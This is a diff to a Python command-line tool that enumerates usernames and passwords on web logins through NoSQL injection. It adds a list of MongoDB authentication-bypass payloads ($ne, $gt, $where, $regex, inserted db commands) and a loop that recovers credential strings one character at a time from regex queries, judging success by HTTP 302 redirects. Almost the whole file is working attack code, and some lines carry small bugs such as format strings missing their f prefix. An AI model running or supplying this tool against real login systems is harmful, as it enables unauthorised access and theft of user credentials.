@@ -1,5 +1,11 @@
 #!/usr/bin/env python3
 
+# Tool used to enumerate username and password through NoSQL injections
+# For now it tests for injections using the {username'[$ne]' : '', password[$ne] : ''}
+# injection payload. If an injection vector is found the script will use regex to
+# find matches for each individual character.
+# References:
+# PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection
 
 import string
 import click
@@ -23,54 +29,85 @@ class bc:
 
 class CodeInjector:
 
-    def __init__(self, h, r, up, pp, tg, ot):
+    def __init__(self, h, r, up, pp, tg, ot, v):
         self.h = h
         self.r = r
         self.up = up
         self.pp = pp
         self.tg = tg
         self.ot = ot
+        self.v = v
 
     def test_injection(self):
-        if self.r is 'POST':
 
-            if self.inject(test=True):
-                stdout.write(bc.OKGREEN + f'[+] Host {self.h} is injectable with "{self.up}" and "{self.pp}" parameters'+'\n'+bc.DEFAULT)
-                return True
-            else:
-                stdout.write(bc.FAIL + f'[-] Host {self.h} is not injectable'+'\n'+bc.DEFAULT)
-                return False
+        # Payloads used for authentication bypass
+        test_payloads = ["[$ne]",
+                        "[$gt]",
+                        "[true, $where: '1 == 1']",
+                        ", $where: '1 == 1'",
+                        "$where: '1 == 1'",
+                        "', $where: '1 == 1'",
+                        "1, $where: '1 == 1'",
+                        "{ $ne: 1 }",
+                        "', $or: [ {}, { 'a':'a",
+                        "' } ], $comment:'successful MongoDB injection'",
+                        "db.injection.insert({success:1});",
+                        "db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1",
+                        "|| 1==1",
+                        "' && this.password.match(/.*/)//+%00",
+                        "' && this.passwordzz.match(/.*/)//+%00",
+                        "'%20%26%26%20this.password.match(/.*/)//+%00",
+                        "'%20%26%26%20this.passwordzz.match(/.*/)//+%00",
+                        "{$gt: ''}",
+                        "[$ne]=1]"]
 
-    def build_payload(self, test=False, char=''):
+        injectable = []
+        if self.r == 'POST':
+            for pay in test_payloads:
+                stdout.write(f'[+] Injecting "{pay}"...')
+                if self.inject(test=True, pay=pay):
+                    stdout.write(bc.OKGREEN + " Success\n" + bc.DEFAULT)
+                    injectable.append(pay)
+                else:
+                    stdout.write(bc.FAIL + " Fail\n" + bc.DEFAULT)
+        if not len(injectable) < 1:
+            stdout.write(bc.OKGREEN + f'[+] Host {self.h} is injectable\n'+bc.DEFAULT
+                                    + '[+] Injectable payloads: \n')
+
+            for p in injectable:
+                stdout.write(f'[+] {p}\n')
+
+            return True
+    def build_payload(self, test=False, char='', pay=''):
 
         injection_payloads = {f"{self.up}"  : {self.up + "[$regex]" : "^" + char + ".*", self.pp + "[$ne]" : "" + "," + self.ot},
                               f"{self.pp}"  : {self.pp + "[$regex]" : "^" + char + ".*", self.up + "[$ne]" : "" + "," + self.ot},
-                              "test_pay" : {self.up + "[$ne]" : "", self.pp + "[$ne]" : "" + "," + self.ot}}
+                              "test_pay" : {self.up + pay : "", self.pp + pay : "" + "," + self.ot}}
         if test:
             return injection_payloads['test_pay']
         if not test:
             return injection_payloads[self.tg]
 
-    def inject(self, test=False):
+    def inject(self, test=False, pay=''):
         badchar = r'&$^*\?+.|'
-        payload = self.build_payload(test=True)
+        payload = self.build_payload(test=True, pay=pay)
         if test:
-            if self.r is 'POST':
+            if self.r == 'POST':
                 test_query = post(self.h, data=payload, allow_redirects=False, verify=False)
                 if test_query.status_code == 302:
                     return True
         else:
             ml = []
             m = ''
-            if self.r is 'POST':
+            if self.r == 'POST':
                 for c in string.printable:
                     if c in badchar:
                         continue
                     payload = self.build_payload(char=c)
                     query = post(self.h, data=payload, allow_redirects=False, verify=False)
                     if query.status_code == 302:
-                        stdout.write(f'[*] Starting character "{c}"\n'
-                                      '[*] Enumerating rest of string...\n')
+                        stdout.write(f'[+] Starting character "{c}"\n'
+                                      '[+] Enumerating rest of string...\n')
                         m += c
                         while True:
                             for cc in string.printable:
@@ -87,9 +124,8 @@ class CodeInjector:
                                 m = ''
                                 break
 
-            stdout.write('[*] Results:\n'
-                        f'[+] Host: {self.h}\n'
-                        f'[+] {self.tg} matches:\n')
+            stdout.write('[+] Results:\n'
+                        f'[+] Matches for {self.tg}:\n')
             for s in ml:
                 stdout.write(f'[*] {s}\n')
 
@@ -128,10 +164,17 @@ def main(
     otherparam='',
     target='',
     host='',
-    output=''):
-    injector = CodeInjector(host, request, userp, passwdp, target, otherparam)
-    stdout.write(f"[*] Target: {host}\n[*] Request type: {request}\n[*] Params: {userp} {passwdp} {otherparam}\n[*] Injection point: {target}\n")
+    output='',
+    verbose=False):
+    injector = CodeInjector(host, request, userp, passwdp, target, otherparam, verbose)
+    stdout.write(f"[+] Target: {host}\n"
+    "[+] Request type: {request}\n[*] Params: {userp} {passwdp} {otherparam}\n"
+    "[+] Injection point: {target}\n"
+    "[+] Checking for injectable parameters...\n")
+
+
     if injector.test_injection():
+        stdout.write("[+] Starting attack...\n")
         results = injector.inject()
         if output:
             write(results, output)
